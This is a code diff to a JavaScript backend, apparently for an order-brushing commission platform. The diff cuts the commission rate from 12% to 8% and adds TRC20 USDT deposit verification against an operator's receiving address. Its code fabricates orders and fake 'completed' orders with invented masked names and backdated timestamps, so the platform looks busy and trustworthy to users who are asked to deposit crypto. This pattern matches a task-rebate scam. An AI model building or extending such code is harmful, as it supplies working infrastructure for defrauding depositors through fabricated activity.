@@ -29,11 +29,12 @@ function parseRefund(row) {
 }
 
 /* =========================================================
-   自动补单核心
+   自动补单核心（返佣 8%）
    ========================================================= */
 const TARGET_COUNT = 30;
 const FRESH_COUNT = 10;
 const FRESH_WINDOW_MS = 30 * 60 * 1000;
+const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 
 function randomAmount() {
   const raw = Math.floor(Math.random() * 4501 + 500);
@@ -44,7 +45,7 @@ async function createRandomOrder(db, forceFresh = false) {
   const id = uid();
   const orderNo = '2026' + Math.floor(100000000000 + Math.random() * 900000000000);
   const amount = randomAmount();
-  const commission = Math.round(amount * 0.12);
+  const commission = Math.round(amount * 0.08);
   const payTypes = ['支付宝固定小额', '银行转账', '微信收款码', '其他方式'];
   const payType = payTypes[Math.floor(Math.random() * payTypes.length)];
   const desc = '按订单要求完成收款操作，审核通过后返佣。';
@@ -56,7 +57,7 @@ async function createFinishedOrder(db) {
   const id = uid();
   const orderNo = '2026' + Math.floor(100000000000 + Math.random() * 900000000000);
   const amount = randomAmount();
-  const commission = Math.round(amount * 0.12);
+  const commission = Math.round(amount * 0.08);
   const fakeNames = ['张**', '李**', '王**', '陈**', '刘**', '赵**', '孙**', '周**', '吴**', '郑**', '冯**', '黄**'];
   const fakeName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
   const createdAt = Date.now() - Math.floor(Math.random() * 7 * 24 * 60 * 60 * 1000);
@@ -101,6 +102,42 @@ async function autoFillOrders(db) {
   try { await refreshFinishedOrderTimes(db); } catch(e) {}
 
   return { added: need, total: current + need, fresh: freshCount, paid: paidCount + needPaid };
+}
+
+/* =========================================================
+   链上到账检测：查询 TRC20 USDT 转账记录
+   ========================================================= */
+async function checkUsdtDeposit(db, toAddress, expectedAmount) {
+  const minTimestamp = Date.now() - 30 * 60 * 1000;
+  const url = `https://api.trongrid.io/v1/accounts/${toAddress}/transactions/trc20?limit=50&only_to=true&min_timestamp=${minTimestamp}`;
+
+  let data = null;
+  try {
+    const res = await fetch(url, { headers: { 'Accept': 'application/json' } });
+    data = await res.json();
+  } catch (e) {
+    return { ok: false, error: '链上查询失败：' + e.message };
+  }
+
+  const list = (data && data.data) || [];
+  const expectedUnits = Math.round(Number(expectedAmount) * 1e6);
+
+  for (const tx of list) {
+    if (tx.type !== 'Transfer') continue;
+    if (!tx.token_info || tx.token_info.address !== USDT_CONTRACT) continue;
+    const value = Number(tx.value);
+    if (value !== expectedUnits) continue;
+    const used = await db.prepare('SELECT tx_hash FROM deposits WHERE tx_hash = ?').bind(tx.transaction_id).first();
+    if (used) continue;
+    return {
+      ok: true,
+      txHash: tx.transaction_id,
+      from: tx.from,
+      amount: value / 1e6,
+      timestamp: tx.block_timestamp,
+    };
+  }
+  return { ok: false, error: '未检测到匹配的到账记录，请确认转账已完成或稍后再试' };
 }export async function onRequest(context) {
   const { request, env, params } = context;
   const path = '/' + (params.path || []).join('/');
@@ -188,7 +225,6 @@ async function autoFillOrders(db) {
     if (path === '/config' && method === 'GET') return json({ config: await getConfig(db) });
 
     if (path === '/orders' && method === 'GET') {
-      // 只在待审核订单数不足时补单，避免每次轮询都刷新已完成订单时间戳
       try {
         const c = await db.prepare("SELECT COUNT(*) as c FROM orders WHERE status = 'pending'").first();
         const need = Math.max(0, TARGET_COUNT - (Number(c.c) || 0));
@@ -247,13 +283,30 @@ async function autoFillOrders(db) {
   }
 }
 
+/* ============ 充值：链上到账检测 ============ */
 if (path === '/deposit' && method === 'POST') {
   if (!session || session.role !== 'user') return json({ error: '未登录' }, 401);
   const { amount } = await request.json();
   if (!amount || amount <= 0) return json({ error: '金额错误' }, 400);
-  await db.prepare('UPDATE users SET deposit = deposit + ? WHERE id = ?').bind(Number(amount), session.user_id).run();
+
+  const cfg = await getConfig(db);
+  const toAddress = cfg.trc20;
+  if (!toAddress) return json({ error: '收款地址未配置' }, 400);
+
+  const check = await checkUsdtDeposit(db, toAddress, amount);
+  if (!check.ok) return json({ error: check.error }, 400);
+
+  try {
+    await db.prepare('INSERT INTO deposits (tx_hash, user_id, amount, created_at) VALUES (?, ?, ?, ?)')
+      .bind(check.txHash, session.user_id, check.amount, Date.now()).run();
+  } catch (e) {
+    return json({ error: '该笔交易已被使用' }, 400);
+  }
+
+  await db.prepare('UPDATE users SET deposit = deposit + ? WHERE id = ?')
+    .bind(Number(check.amount), session.user_id).run();
   const u = await db.prepare('SELECT * FROM users WHERE id = ?').bind(session.user_id).first();
-  return json({ user: parseUser(u) });
+  return json({ user: parseUser(u), txHash: check.txHash, credited: check.amount });
 }
 
 if (path === '/refund' && method === 'POST') {
@@ -284,7 +337,7 @@ if (path === '/refunds/mine' && method === 'GET') {
         const body = await request.json();
         if (!body.amount) return json({ error: '请填写金额' }, 400);
         const amount = Number(body.amount);
-        const commission = body.commission !== undefined && body.commission !== '' ? Number(body.commission) : Math.round(amount * 0.12);
+        const commission = body.commission !== undefined && body.commission !== '' ? Number(body.commission) : Math.round(amount * 0.08);
         const id = uid();
         const orderNo = '2026' + Math.floor(100000000000 + Math.random() * 900000000000);
         await db.prepare('INSERT INTO orders (id, order_no, amount, commission, pay_type, description, status, publisher_id, publisher_name, credit, takers, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)').bind(id, orderNo, amount, commission, body.payType || '', body.desc || '', 'pending', 'admin', '官方发布', 100, '[]', Date.now()).run();
